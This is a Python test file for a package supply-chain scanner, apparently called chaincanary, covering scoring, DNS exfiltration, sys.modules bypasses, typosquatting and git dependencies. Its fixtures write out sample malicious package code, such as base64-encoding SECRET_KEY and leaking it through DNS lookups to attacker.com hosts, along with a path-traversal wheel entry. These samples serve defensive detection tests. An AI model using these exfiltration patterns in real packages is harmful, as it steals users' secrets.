"""
Tests for all fixes from the multi-angle review:
  - P0: Scoring system (single CRITICAL, LOW accumulation)
  - P0: DNS exfiltration detection
  - P0: sys.modules bypass detection
  - P1: Typosquatting detection
  - P1: Git dependency flagging in lockfile
"""

import tempfile
import zipfile
from pathlib import Path

from chaincanary.analyzer.pth_analyzer import PthClass, analyze_pth_content
from chaincanary.analyzer.static import StaticAnalyzer
from chaincanary.lockfile import parse_requirements_txt
from chaincanary.models import Finding, RiskReport, Severity
from chaincanary.safety_checks import check_typosquatting


def make_wheel(name: str, version: str, files: dict) -> Path:
    tmpdir = Path(tempfile.mkdtemp())
    whl = tmpdir / f"{name}-{version}-py3-none-any.whl"
    with zipfile.ZipFile(whl, "w") as zf:
        for fname, content in files.items():
            zf.writestr(fname, content)
    return whl


# ═══════════════════════════════════════════════════════════════════
# P0-1: Scoring System
# ═══════════════════════════════════════════════════════════════════


class TestScoringSystem:
    """Verify the fixed scoring model."""

    def _report(self, severities: list[Severity]) -> RiskReport:
        r = RiskReport(package="x", version="1.0")
        for s in severities:
            r.findings.append(Finding("R", s, "title", "desc"))
        r.calculate_score()
        return r

    def test_single_critical_is_high_risk_not_low_risk(self):
        """BUG FIX: 1×CRITICAL must be HIGH_RISK (was LOW_RISK before fix)."""
        r = self._report([Severity.CRITICAL])
        assert r.verdict == "HIGH_RISK", f"Single CRITICAL must be HIGH_RISK, got {r.verdict}"

    def test_two_critical_is_malicious(self):
        r = self._report([Severity.CRITICAL, Severity.CRITICAL])
        assert r.verdict == "MALICIOUS"

    def test_three_critical_is_malicious(self):
        r = self._report([Severity.CRITICAL] * 3)
        assert r.verdict == "MALICIOUS"
        assert r.score == 10.0

    def test_litellm_attack_is_malicious(self):
        """LiteLLM 1.82.7 has 3×CRITICAL → MALICIOUS."""
        r = self._report([Severity.CRITICAL] * 3)
        assert r.verdict == "MALICIOUS"

    def test_20_low_is_not_high_risk(self):
        """BUG FIX: 20×LOW must NOT be HIGH_RISK (LOW noise should be capped)."""
        r = self._report([Severity.LOW] * 20)
        # Capped at 8, so 8 * 0.3 = 2.4 → LOW_RISK
        assert r.verdict in ("SAFE", "LOW_RISK"), (
            f"20×LOW should not be HIGH_RISK, got {r.verdict} (score={r.score})"
        )

    def test_single_high_is_low_risk(self):
        """1×HIGH = 2.5 score → LOW_RISK (no CRITICAL floor)."""
        r = self._report([Severity.HIGH])
        assert r.verdict == "LOW_RISK"

    def test_three_high_is_high_risk(self):
        """3×HIGH → floor to HIGH_RISK."""
        r = self._report([Severity.HIGH] * 3)
        assert r.verdict in ("HIGH_RISK", "MALICIOUS")

    def test_clean_package_is_safe(self):
        r = self._report([])
        assert r.verdict == "SAFE"
        assert r.score == 0.0

    def test_score_capped_at_10(self):
        r = self._report([Severity.CRITICAL] * 10)
        assert r.score == 10.0

    def test_is_blocked_matches_verdict(self):
        """is_blocked property must align with MALICIOUS verdict."""
        r = self._report([Severity.CRITICAL] * 3)
        assert r.verdict == "MALICIOUS"
        assert r.is_blocked is True

    def test_is_blocked_false_for_high_risk(self):
        r = self._report([Severity.CRITICAL])
        assert r.verdict == "HIGH_RISK"
        assert r.is_blocked is False

    def test_low_accumulation_capped(self):
        """More than 8 LOW findings should not keep inflating score."""
        r8 = self._report([Severity.LOW] * 8)
        r100 = self._report([Severity.LOW] * 100)
        assert r8.score == r100.score, "LOW findings must be capped"


# ═══════════════════════════════════════════════════════════════════
# P0-2: DNS Exfiltration & sys.modules Detection
# ═══════════════════════════════════════════════════════════════════


class TestDNSExfilAndBypassDetection:
    def setup_method(self):
        self.static = StaticAnalyzer()

    def test_socket_getaddrinfo_in_init_detected(self):
        """DNS exfil via socket.getaddrinfo must be caught."""
        whl = make_wheel(
            "evil",
            "1.0.0",
            {
                "evil/__init__.py": (
                    "import socket, os, base64\n"
                    "hostname = base64.b64encode(os.environ.get('SECRET_KEY','').encode()).decode()\n"
                    "socket.getaddrinfo(hostname[:50]+'.c2.attacker.com', 80)\n"
                ),
            },
        )
        findings = self.static.analyze_wheel(whl)
        rule_ids = [f.rule_id for f in findings]
        assert "DNS_EXFIL" in rule_ids, (
            f"DNS exfil via socket.getaddrinfo not detected. Got: {rule_ids}"
        )

    def test_socket_gethostbyname_in_init_detected(self):
        """DNS exfil via socket.gethostbyname must be caught."""
        whl = make_wheel(
            "evil",
            "1.0.0",
            {
                "evil/__init__.py": (
                    "import socket\nsocket.gethostbyname('stolen-data.evil.com')\n"
                ),
            },
        )
        findings = self.static.analyze_wheel(whl)
        rule_ids = [f.rule_id for f in findings]
        assert "DNS_EXFIL" in rule_ids

    def test_dns_exfil_severity_is_high(self):
        """DNS exfil should be HIGH severity."""
        whl = make_wheel(
            "evil",
            "1.0.0",
            {
                "evil/__init__.py": "import socket; socket.getaddrinfo('evil.com', 80)",
            },
        )
        findings = self.static.analyze_wheel(whl)
        dns_finding = next((f for f in findings if f.rule_id == "DNS_EXFIL"), None)
        assert dns_finding is not None
        assert dns_finding.severity == Severity.HIGH

    def test_sys_modules_access_detected(self):
        """sys.modules[] indirect access must be flagged."""
        whl = make_wheel(
            "evil",
            "1.0.0",
            {
                "evil/__init__.py": (
                    "import sys\n"
                    "if 'requests' in sys.modules:\n"
                    "    sys.modules['requests'].get('http://c2.evil.com')\n"
                ),
            },
        )
        findings = self.static.analyze_wheel(whl)
        rule_ids = [f.rule_id for f in findings]
        assert "SYS_MODULES_ACCESS" in rule_ids, f"sys.modules bypass not detected. Got: {rule_ids}"

    def test_sys_modules_get_detected(self):
        whl = make_wheel(
            "evil",
            "1.0.0",
            {
                "evil/__init__.py": "import sys; m = sys.modules.get('urllib.request'); m.urlopen('http://evil.com')",
            },
        )
        findings = self.static.analyze_wheel(whl)
        rule_ids = [f.rule_id for f in findings]
        assert "SYS_MODULES_ACCESS" in rule_ids

    def test_clean_socket_use_not_flagged_in_non_init(self):
        """socket usage in non-init files should not trigger DNS_EXFIL."""
        whl = make_wheel(
            "mylib",
            "1.0.0",
            {
                "mylib/__init__.py": "# clean",
                "mylib/server.py": "import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 8080))",
            },
        )
        findings = self.static.analyze_wheel(whl)
        dns = [f for f in findings if f.rule_id == "DNS_EXFIL"]
        assert dns == [], f"False positive DNS_EXFIL in non-init: {dns}"

    def test_socket_in_pth_is_dangerous(self):
        """socket.* in .pth should be DANGEROUS (already labeled 'raw socket')."""
        content = "import socket; socket.getaddrinfo('evil.com', 80)"
        analysis = analyze_pth_content(content)
        assert analysis.pth_class == PthClass.DANGEROUS


# ═══════════════════════════════════════════════════════════════════
# P1: Typosquatting Detection
# ═══════════════════════════════════════════════════════════════════


class TestTyposquatting:
    def test_reqeusts_is_typosquat_of_requests(self):
        """'reqeusts' (transposed) should be flagged."""
        result = check_typosquatting("reqeusts")
        assert result is not None
        assert result["target"] == "requests"

    def test_requets_is_typosquat_of_requests(self):
        """'requets' (missing s) should be flagged."""
        result = check_typosquatting("requets")
        assert result is not None
        assert result["target"] == "requests"

    def test_requests_itself_is_not_typosquat(self):
        """Exact match of a popular package must not be flagged."""
        result = check_typosquatting("requests")
        assert result is None

    def test_completely_different_package_not_flagged(self):
        result = check_typosquatting("astrophysics-simulation-toolkit")
        assert result is None

    def test_numpy_exact_not_flagged(self):
        result = check_typosquatting("numpy")
        assert result is None

    def test_numpyy_is_typosquat(self):
        """'numpyy' (extra y) should be detected."""
        result = check_typosquatting("numpyy")
        assert result is not None
        assert result["target"] == "numpy"

    def test_distance_1_is_likely_typosquat(self):
        """Edit distance 1 should set likely_typosquat=True."""
        result = check_typosquatting("reqeusts")  # transposition = distance 1 or 2
        if result:
            # likely_typosquat should be True for very close names
            assert result["distance"] <= 2

    def test_flask_not_flagged(self):
        result = check_typosquatting("flask")
        assert result is None

    def test_fIask_with_capital_I_flagged(self):
        """'fIask' (capital I replacing l) is a classic visual substitution attack."""
        result = check_typosquatting("fIask")
        # Edit distance is 1, should be caught
        assert result is not None


# ═══════════════════════════════════════════════════════════════════
# P1: Git Dependencies
# ═══════════════════════════════════════════════════════════════════


class TestGitDependencies:
    def test_git_dep_parsed(self):
        """git+https:// line should be parsed as is_git_dep=True."""
        content = (
            "requests==2.28.0\n"
            "git+https://github.com/evil/requests.git@main#egg=requests\n"
            "flask==2.3.0\n"
        )
        tmp = Path(tempfile.mkdtemp()) / "requirements.txt"
        tmp.write_text(content)
        specs = parse_requirements_txt(tmp)
        git_specs = [s for s in specs if s.is_git_dep]
        assert len(git_specs) == 1
        assert git_specs[0].is_git_dep is True

    def test_git_dep_url_preserved(self):
        content = "git+https://github.com/attacker/evil.git@deadbeef#egg=mylib\n"
        tmp = Path(tempfile.mkdtemp()) / "requirements.txt"
        tmp.write_text(content)
        specs = parse_requirements_txt(tmp)
        git_specs = [s for s in specs if s.is_git_dep]
        assert len(git_specs) == 1
        assert "github.com/attacker/evil" in git_specs[0].git_url

    def test_regular_packages_not_git(self):
        content = "requests==2.28.0\nflask==2.3.0\n"
        tmp = Path(tempfile.mkdtemp()) / "requirements.txt"
        tmp.write_text(content)
        specs = parse_requirements_txt(tmp)
        assert all(not s.is_git_dep for s in specs)

    def test_editable_git_dep_flagged(self):
        content = "-e git+https://github.com/evil/mylib.git#egg=mylib\n"
        tmp = Path(tempfile.mkdtemp()) / "requirements.txt"
        tmp.write_text(content)
        specs = parse_requirements_txt(tmp)
        git_specs = [s for s in specs if s.is_git_dep]
        assert len(git_specs) == 1


# ═══════════════════════════════════════════════════════════════════
# Regression: make sure prior tests still pass after fixes
# ═══════════════════════════════════════════════════════════════════


class TestRegressionAfterFixes:
    """Ensure previous fixes didn't break anything."""

    def setup_method(self):
        self.static = StaticAnalyzer()

    def test_litellm_attack_still_malicious(self):
        import tempfile

        from tests.fixtures.mock_packages import create_mock_litellm_attack

        d = Path(tempfile.mkdtemp())
        whl = create_mock_litellm_attack(d)
        findings = self.static.analyze_wheel(whl, "litellm")
        r = RiskReport(package="litellm", version="1.82.7", findings=findings)
        r.calculate_score()
        assert r.verdict == "MALICIOUS"
        assert r.score == 10.0

    def test_empty_pth_still_silent(self):
        whl = make_wheel(
            "pytest-cov",
            "4.0.0",
            {
                "pytest_cov/__init__.py": "# ok",
                "pytest-cov.pth": "",
            },
        )
        findings = self.static.analyze_wheel(whl)
        assert findings == []

    def test_setuptools_shim_still_low(self):
        whl = make_wheel(
            "setuptools",
            "69.0.0",
            {
                "setuptools/__init__.py": "# ok",
                "distutils-precedence.pth": (
                    "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
                    "enabled = os.environ.get(var, 'local') == 'local'; "
                    "enabled and __import__('_distutils_hack').add_shim()"
                ),
            },
        )
        findings = self.static.analyze_wheel(whl, "setuptools")
        criticals = [f for f in findings if f.severity == Severity.CRITICAL]
        assert criticals == []

    def test_path_traversal_still_critical(self):
        tmpdir = Path(tempfile.mkdtemp())
        whl = tmpdir / "evil-1.0.0-py3-none-any.whl"
        with zipfile.ZipFile(whl, "w") as zf:
            info = zipfile.ZipInfo("../../evil_file.py")
            zf.writestr(info, "malicious")
        findings = self.static.analyze_wheel(whl)
        rule_ids = [f.rule_id for f in findings]
        assert "WHEEL_PATH_TRAVERSAL" in rule_ids
